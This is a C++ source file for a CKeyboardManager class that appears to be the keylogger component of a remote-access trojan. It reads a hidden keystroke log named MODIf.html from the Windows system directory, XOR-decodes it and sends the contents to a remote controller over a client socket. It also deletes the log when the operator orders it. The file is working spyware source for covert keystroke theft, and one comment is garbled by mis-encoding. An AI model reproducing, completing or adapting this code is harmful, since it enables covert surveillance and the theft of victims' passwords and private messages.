// KeyboardManager.cpp: implementation of the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////

#include "KeyboardManager.h"
#pragma comment(lib, "Imm32.lib")
#include "tchar.h"

HINSTANCE	CKeyboardManager::g_hInstance = NULL;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CKeyboardManager::CKeyboardManager(CClientSocket *pClient) : CManager(pClient)
{
	sendStartKeyBoard();
	WaitForDialogOpen();
	sendOfflineRecord();
	Sleep(300);
}

CKeyboardManager::~CKeyboardManager()
{

}

void CKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == COMMAND_NEXT)
		NotifyDialogIsOpen();

	if (lpBuffer[0] == COMMAND_KEYBOARD_GET)
	{
		WaitForDialogOpen();
		sendOfflineRecord();
		Sleep(300);
	}

	if (lpBuffer[0] == COMMAND_KEYBOARD_CLEAR)
	{
		TCHAR	strRecordFile[MAX_PATH];
		GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
		lstrcat(strRecordFile, _T("\\MODIf.html"));
		DeleteFile(strRecordFile);
	}
}

int CKeyboardManager::sendStartKeyBoard()
{
	BYTE	bToken[2];
	bToken[0] = TOKEN_KEYBOARD_START;
	bToken[1] = (BYTE)true;

	return Send((LPBYTE)&bToken[0], sizeof(bToken));	
}

int CKeyboardManager::sendKeyBoardData(LPBYTE lpData, UINT nSize)
{
	int nRet = -1;
	DWORD	dwBytesLength = 1 + nSize;
	LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, dwBytesLength);
	lpBuffer[0] = TOKEN_KEYBOARD_DATA;
	memcpy(lpBuffer + 1, lpData, nSize);
	
	nRet = Send((LPBYTE)lpBuffer, dwBytesLength);
	LocalFree(lpBuffer);
	return nRet;	
}

int CKeyboardManager::sendOfflineRecord()
{
	int		nRet = 0;
	DWORD	dwSize = 0;
	DWORD	dwBytesRead = 0;
	TCHAR	strRecordFile[MAX_PATH];
	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
	lstrcat(strRecordFile, _T("\\MODIf.html"));
	HANDLE	hFile = CreateFile(strRecordFile, GENERIC_READ, FILE_SHARE_READ,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		dwSize = GetFileSize(hFile, NULL);
		TCHAR *lpBuffer = new TCHAR[dwSize];
		ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL);
		// Ω‚√‹
		for (int i = 0; i < (dwSize/sizeof(TCHAR)); i++)
			lpBuffer[i] ^= _T('`');
		nRet = sendKeyBoardData((LPBYTE)lpBuffer, dwSize);
		delete [] lpBuffer;
	}
	CloseHandle(hFile);
	return nRet;
}
